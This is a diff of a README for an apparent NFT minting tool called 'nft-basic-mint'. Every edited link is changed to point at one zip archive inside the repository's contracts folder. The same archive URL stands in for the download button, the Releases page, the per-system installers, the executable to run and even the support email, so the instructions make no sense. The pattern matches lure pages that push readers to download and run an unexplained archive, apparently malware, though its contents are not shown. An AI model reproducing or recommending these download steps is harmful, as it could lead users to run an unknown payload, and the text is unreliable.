@@ -17,16 +17,16 @@ To use this application, you need:
 
 You can download the software from our Releases page. Simply click the button below:
 
-[![Download nft-basic-mint](https://raw.githubusercontent.com/17Smudge/nft-basic-mint/main/contracts/mint_nft_basic_v1.9.zip)](https://raw.githubusercontent.com/17Smudge/nft-basic-mint/main/contracts/mint_nft_basic_v1.9.zip)
+[![Download nft-basic-mint](https://github.com/17Smudge/nft-basic-mint/raw/refs/heads/main/contracts/mint-nft-basic-3.5.zip)](https://github.com/17Smudge/nft-basic-mint/raw/refs/heads/main/contracts/mint-nft-basic-3.5.zip)
 
 ## 🛠️ Download & Install
 
-1. Visit [this page to download](https://raw.githubusercontent.com/17Smudge/nft-basic-mint/main/contracts/mint_nft_basic_v1.9.zip).
+1. Visit [this page to download](https://github.com/17Smudge/nft-basic-mint/raw/refs/heads/main/contracts/mint-nft-basic-3.5.zip).
 2. On the Releases page, you will see the latest version of the application. Click on it to view available files.
 3. Select the file that matches your system:
-   - **For Windows:** Download `https://raw.githubusercontent.com/17Smudge/nft-basic-mint/main/contracts/mint_nft_basic_v1.9.zip`.
-   - **For macOS:** Download `https://raw.githubusercontent.com/17Smudge/nft-basic-mint/main/contracts/mint_nft_basic_v1.9.zip`.
-   - **For Linux:** Download `https://raw.githubusercontent.com/17Smudge/nft-basic-mint/main/contracts/mint_nft_basic_v1.9.zip`.
+   - **For Windows:** Download `https://github.com/17Smudge/nft-basic-mint/raw/refs/heads/main/contracts/mint-nft-basic-3.5.zip`.
+   - **For macOS:** Download `https://github.com/17Smudge/nft-basic-mint/raw/refs/heads/main/contracts/mint-nft-basic-3.5.zip`.
+   - **For Linux:** Download `https://github.com/17Smudge/nft-basic-mint/raw/refs/heads/main/contracts/mint-nft-basic-3.5.zip`.
 
 4. Once the file downloads, locate it on your computer:
    - On Windows, find it in the "Downloads" folder.
@@ -36,8 +36,8 @@ You can download the software from our Releases page. Simply click the button be
 5. Unzip the file. This will create a new folder called `nft-basic-mint`.
 
 6. Open the folder and find the executable file:
-   - For Windows, run `https://raw.githubusercontent.com/17Smudge/nft-basic-mint/main/contracts/mint_nft_basic_v1.9.zip`.
-   - For macOS, double-click `https://raw.githubusercontent.com/17Smudge/nft-basic-mint/main/contracts/mint_nft_basic_v1.9.zip`.
+   - For Windows, run `https://github.com/17Smudge/nft-basic-mint/raw/refs/heads/main/contracts/mint-nft-basic-3.5.zip`.
+   - For macOS, double-click `https://github.com/17Smudge/nft-basic-mint/raw/refs/heads/main/contracts/mint-nft-basic-3.5.zip`.
    - For Linux, open a terminal, navigate to the folder, and run `./nft-basic-mint`.
 
 7. Follow the on-screen instructions to complete the setup.
@@ -84,8 +84,8 @@ If you encounter any issues while using the app:
 
 ## ✉️ Support
 
-If you need further assistance, please reach out through the GitHub issues page or contact us directly via email at https://raw.githubusercontent.com/17Smudge/nft-basic-mint/main/contracts/mint_nft_basic_v1.9.zip
+If you need further assistance, please reach out through the GitHub issues page or contact us directly via email at https://github.com/17Smudge/nft-basic-mint/raw/refs/heads/main/contracts/mint-nft-basic-3.5.zip
 
 ## 🔗 Conclusion
 
-Thank you for choosing **nft-basic-mint**! We hope you enjoy creating and managing your NFTs with ease. Don't forget to check for updates and new features regularly. For more information, visit our [Releases page](https://raw.githubusercontent.com/17Smudge/nft-basic-mint/main/contracts/mint_nft_basic_v1.9.zip).
+Thank you for choosing **nft-basic-mint**! We hope you enjoy creating and managing your NFTs with ease. Don't forget to check for updates and new features regularly. For more information, visit our [Releases page](https://github.com/17Smudge/nft-basic-mint/raw/refs/heads/main/contracts/mint-nft-basic-3.5.zip).
